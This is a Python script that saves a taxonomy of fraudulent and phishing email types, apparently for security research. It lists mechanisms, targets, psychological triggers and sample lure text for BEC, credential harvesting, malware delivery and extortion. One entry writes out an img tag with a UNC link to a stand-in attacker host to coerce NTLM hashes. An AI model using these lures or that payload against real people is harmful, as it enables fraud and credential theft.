import json
import sys

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

FAKE_EMAIL_TAXONOMY = {
    "dimensions": [
        {
            "category_id": "MOTIVE-01-FINANCIAL-FRAUD",
            "name": "Direct Financial Theft & Capital Exfiltration",
            "threat_level": "CRITICAL",
            "sub_vectors": [
                {
                    "name": "CEO Fraud / Business Email Compromise (BEC)",
                    "target": "Finance, Accounting, Treasury Teams",
                    "mechanism": "Display-name spoofing or compromised executive mailbox requesting urgent, confidential wire transfer.",
                    "psychological_trigger": "Authority (Cialdini) + Urgency + Strict Confidentiality",
                    "real_world_example": "Executive imposter asks Controller to wire $450,000 for an 'off-the-record M&A deposit'."
                },
                {
                    "name": "Vendor Email Compromise (VEC) / Invoice Redirection",
                    "target": "Accounts Payable, Procurement",
                    "mechanism": "Attacker injects themselves into legitimate vendor payment threads or registers lookalike vendor domain, advising of 'updated banking/ACH routing details'.",
                    "psychological_trigger": "Legitimacy + Established Trust Relationship",
                    "real_world_example": "Spoofed supplier sends 'Notice of Bank Account Migration' right before multi-million quarterly invoice due date."
                },
                {
                    "name": "Payroll Diversion Fraud",
                    "target": "Human Resources, Payroll Specialists",
                    "mechanism": "Impersonates an employee via external free webmail requesting direct deposit paycheck routing change.",
                    "psychological_trigger": "Routine Administrative Request",
                    "real_world_example": "'Hi HR, please update my direct deposit to this new GreenDot prepaid card before Friday's run.'"
                },
                {
                    "name": "Fraudulent Overdue Invoices & Collection Threats",
                    "target": "General Office, Accounts",
                    "mechanism": "Fake invoice attachment (.pdf, .html) alleging past-due balance with threat of legal action or credit reporting.",
                    "psychological_trigger": "Fear of Consequence + Urgency",
                    "real_world_example": "'FINAL NOTICE: Overdue Invoice #88492 will be sent to collections within 24 hours.'"
                },
                {
                    "name": "Gift Card Purchasing Scheme",
                    "target": "Subordinate Employees, Assistants",
                    "mechanism": "Claims executive is stuck in conference, asks assistant to purchase Apple/Amazon/Google Play cards and email back the scratched PINs.",
                    "psychological_trigger": "Pleasing Authority + High Pressure",
                    "real_world_example": "'I am in meetings all day. Need 10x $100 Apple cards for client gifts. Don't call me, just email codes.'"
                },
                {
                    "name": "Advance Fee / Inheritance / Lottery Fraud (419 Scams)",
                    "target": "Consumers, Elderly, Vulnerable Individuals",
                    "mechanism": "Promises millions in unclaimed inheritance or government grant if victim wires advance legal/handling fees.",
                    "psychological_trigger": "Greed + Hope + Scarcity",
                    "real_world_example": "'Barrister John Cole: Deceased client left $12.5M in your family name.'"
                },
                {
                    "name": "Cryptocurrency Investment & Liquidity Pool Scams",
                    "target": "Crypto Investors, Tech Workers",
                    "mechanism": "Fake airdrop notices, token presale alerts, or hacked wallet warnings redirecting to Web3 drainer smart contracts.",
                    "psychological_trigger": "FOMO (Fear of Missing Out) + Quick Wealth",
                    "real_world_example": "'Exclusive Airdrop: Claim 5,000 $ARB before claim window closes in 2 hours.'"
                }
            ]
        },
        {
            "category_id": "MOTIVE-02-CREDENTIAL-HARVESTING",
            "name": "Identity Harvesting & Account Takeover (ATO)",
            "threat_level": "CRITICAL",
            "sub_vectors": [
                {
                    "name": "Enterprise Single Sign-On (SSO) Portal Mimicry",
                    "target": "All Enterprise Workforce",
                    "mechanism": "Cloned Microsoft 365, Google Workspace, Okta, or Ping Identity login page with anchor-text mismatch.",
                    "psychological_trigger": "Routine Authentication + System Maintenance",
                    "real_world_example": "'Microsoft 365: Your password expires in 2 hours. Click here to retain current password.'"
                },
                {
                    "name": "Adversary-in-the-Middle (AitM) Reverse Proxy Phishing",
                    "target": "Employees with Multi-Factor Authentication (MFA)",
                    "mechanism": "Tools like Evilginx2 proxy real login in real time, capturing session cookies and bearer tokens to bypass FIDO2/TOTP.",
                    "psychological_trigger": "Seamless Familiarity (Victim sees genuine IdP)",
                    "real_world_example": "Victim logs into real Azure AD via proxy; attacker intercepts ESTSAUTH cookie and hijacks session."
                },
                {
                    "name": "Banking & Payment Gateway Harvesting",
                    "target": "Retail Banking Customers, E-Commerce Merchants",
                    "mechanism": "Spoofs PayPal, Wells Fargo, Stripe, Chase alleging account limitation or suspicious transaction.",
                    "psychological_trigger": "Financial Panic + Loss Aversion",
                    "real_world_example": "'Your PayPal account has been limited due to an unrecognized login from Vietnam.'"
                },
                {
                    "name": "VPN, Remote Access & Citrix Credential Theft",
                    "target": "Remote Workers, IT Contractors",
                    "mechanism": "Spoofed GlobalProtect, Cisco AnyConnect, or Fortinet portals to obtain initial perimeter breach credentials.",
                    "psychological_trigger": "Work Interruption + Access Requirement",
                    "real_world_example": "'IT Help Desk: Urgent SSL-VPN certificate upgrade required to maintain network access.'"
                },
                {
                    "name": "Quishing (QR Code Phishing)",
                    "target": "Corporate Users with Mobile Devices",
                    "mechanism": "Embeds QR code in email body or attached PDF. Bypasses desktop secure email gateways by shifting user to personal mobile browser.",
                    "psychological_trigger": "Convenience + Mobile Migration",
                    "real_world_example": "'Scan this QR code with your authenticator app to enroll in mandatory 2FA upgrade.'"
                }
            ]
        },
        {
            "category_id": "MOTIVE-03-MALWARE-DISTRIBUTION",
            "name": "Malware Infiltration & Initial Access Brokering (IAB)",
            "threat_level": "CRITICAL",
            "sub_vectors": [
                {
                    "name": "Ransomware Precursor Loaders",
                    "target": "Broad Corporate Networks",
                    "mechanism": "Droppers (Qakbot, Emotet, IcedID, DarkGate) delivered via attachments that establish C2 and sell access to ransomware syndicates (LockBit, BlackCat).",
                    "psychological_trigger": "Curiosity + Administrative Lures",
                    "real_world_example": "Password-protected ZIP containing shortcut (.lnk) that spawns PowerShell loader."
                },
                {
                    "name": "Information Stealers (Infostealers)",
                    "target": "Individual Workstations, Developers",
                    "mechanism": "Delivers Lumma, RedLine, Vidar, or Raccoon Stealer to scrape browser auto-fill, saved passwords, crypto wallet seeds, and Discord/Telegram session tokens.",
                    "psychological_trigger": "Free Software, Game Cheats, Resume Reviews",
                    "real_world_example": "'Resume_Candidate_Senior_Dev.pdf.exe' executed by recruiting department."
                },
                {
                    "name": "Remote Access Trojans (RATs) & C2 Frameworks",
                    "target": "Critical Infrastructure, System Admins",
                    "mechanism": "Deploying AsyncRAT, Remcos, NetWire, or Cobalt Strike beacons for persistent network backdoor access.",
                    "psychological_trigger": "Operational Disruption Alarms",
                    "real_world_example": "Excel document with disguised macro ('Enable Content to decrypt secure data')."
                },
                {
                    "name": "HTML Smuggling Payloads",
                    "target": "Enterprises with Heavy Web Proxies",
                    "mechanism": "Attaches .html file that uses browser JavaScript Blobs and Data URIs to construct executable/ISO payload locally, completely evading firewall transit inspection.",
                    "psychological_trigger": "Voicemail, Secure Document Download",
                    "real_world_example": "HTML file with embedded base64 array that triggers auto-download of 'Encrypted_Doc.iso'."
                }
            ]
        },
        {
            "category_id": "MOTIVE-04-OAUTH-ABUSE",
            "name": "OAuth Application Consent Grant Phishing",
            "threat_level": "HIGH",
            "sub_vectors": [
                {
                    "name": "Illicit Consent Grants (Cloud Persistence)",
                    "target": "Microsoft 365, Google Workspace Users",
                    "mechanism": "Tricks user into authorizing a rogue cloud app requesting Mail.ReadWrite, Files.ReadWrite.All, Offline_Access. Grants permanent API access without password.",
                    "psychological_trigger": "Legitimate Cloud Workflow",
                    "real_world_example": "'Shared File: Click Accept to access the corporate Q4 strategic roadmap in SharePoint.'"
                }
            ]
        },
        {
            "category_id": "MOTIVE-05-ESPIONAGE-RECON",
            "name": "Cyber Espionage, Reconnaissance & Nation-State Intelligence",
            "threat_level": "CRITICAL",
            "sub_vectors": [
                {
                    "name": "Advanced Persistent Threat (APT) Spearphishing",
                    "target": "Defense Contractors, Aerospace, Government Agencies, Think Tanks",
                    "mechanism": "Highly tailored spearphishing using bespoke 0-day exploits (PDF, Office, Windows kernel) to exfiltrate classified blueprints and military intelligence.",
                    "psychological_trigger": "Hyper-Targeted Topical Relevance",
                    "real_world_example": "Invite to international geopolitical symposium from a colleague's compromised email."
                },
                {
                    "name": "Directory Harvest & Mailbox Validation Probes",
                    "target": "Corporate Mail Servers",
                    "mechanism": "Sends thousands of pseudo-random emails to test SMTP response codes (550 User Not Found vs 250 OK) to map active employee directory.",
                    "psychological_trigger": "Zero Human Interaction Needed",
                    "real_world_example": "Automated probes: 'john.smith@', 'j.smith@', 'jsmith@' to identify corporate naming conventions."
                },
                {
                    "name": "NTLM Hash Coercion & Internal Mapping",
                    "target": "Internal Enterprise Networks",
                    "mechanism": "HTML email with remote UNC image link (e.g., <img src='\\\\attacker-ip\\share\\logo.png'>). Windows client automatically sends NTLMv2 challenge-response hash.",
                    "psychological_trigger": "Silent Background Fetch",
                    "real_world_example": "Email triggers background Windows SMB auth, attacker captures and cracks NetNTLM hash."
                }
            ]
        },
        {
            "category_id": "MOTIVE-06-EXTORTION-BLACKMAIL",
            "name": "Extortion, Sextortion & Psychological Coercion",
            "threat_level": "HIGH",
            "sub_vectors": [
                {
                    "name": "Sextortion & Webcam Malware Hoaxes",
                    "target": "General Public, Corporate Executives",
                    "mechanism": "Claims victim was recorded on webcam visiting adult sites; quotes a leaked historical password from old data breach as 'proof'.",
                    "psychological_trigger": "Shame + Panic + Secrecy",
                    "real_world_example": "'I have recorded your split-screen video. Pay $1,200 in Bitcoin or I send it to your Facebook friends.'"
                },
                {
                    "name": "Data Breach Leak Extortion",
                    "target": "Corporate Executives, Board Members",
                    "mechanism": "Threatens to release stolen customer records, financial statements, or source code to journalists or regulators if ransom isn't paid.",
                    "psychological_trigger": "Reputational Catastrophe + Regulatory Fines",
                    "real_world_example": "'We have 200GB of your customer database. You have 72 hours to pay $50,000 before public leak.'"
                }
            ]
        },
        {
            "category_id": "MOTIVE-07-IDENTITY-THEFT",
            "name": "PII Harvesting & Synthetic Identity Fraud",
            "target": "HR, Tax Professionals, Citizens",
            "sub_vectors": [
                {
                    "name": "W-2 & Tax Form Harvesters",
                    "mechanism": "CEO impersonation requesting all corporate W-2 PDF files, harvesting employee SSNs, full names, salaries, and addresses.",
                    "psychological_trigger": "Executive Priority Compliance",
                    "real_world_example": "'Please send me the PDF copies of all 2025 W-2 forms for urgent tax filing audit.'"
                },
                {
                    "name": "Government Agency Spoofs (IRS, Social Security, HMRC)",
                    "mechanism": "Alleges unpaid taxes or unclaimed refund, directing victim to upload passport, driver's license, and SSN.",
                    "psychological_trigger": "Government Authority + Legal Coercion",
                    "real_world_example": "'IRS Notice: You have an unclaimed federal refund of $1,420. Complete Form 1040-EZ online.'"
                }
            ]
        },
        {
            "category_id": "MOTIVE-08-DISINFORMATION-DEFAMATION",
            "name": "Reputation Sabotage, Stock Manipulation & Disinformation",
            "sub_vectors": [
                {
                    "name": "Competitor Defamation & Brand Sabotage",
                    "target": "Customers, Media, Public",
                    "mechanism": "Forges email from competitor's domain issuing offensive statements or announcing product recall to damage brand trust.",
                    "psychological_trigger": "Public Outrage",
                    "real_world_example": "Spoofed email to press from rival firm announcing fraudulent CEO resignation."
                },
                {
                    "name": "Stock Short-Seller Disinformation",
                    "target": "Traders, Investors, Analysts",
                    "mechanism": "Circulating fake SEC regulatory investigation notices against a publicly traded company to drive down stock prices.",
                    "psychological_trigger": "Market Fear & Panic Selling",
                    "real_world_example": "'SEC Regulatory Alert: Emergency Trading Halt on $XYZ Corp for Financial Irregularities.'"
                }
            ]
        }
    ]
}

def save_taxonomy():
    with open("research/fake_email_reasons/comprehensive_reasons_taxonomy.json", "w", encoding="utf-8") as f:
        json.dump(FAKE_EMAIL_TAXONOMY, f, indent=2)
    print(f"[+] Successfully compiled comprehensive fake email reasons taxonomy ({len(FAKE_EMAIL_TAXONOMY['dimensions'])} major categories).")

if __name__ == '__main__':
    save_taxonomy()
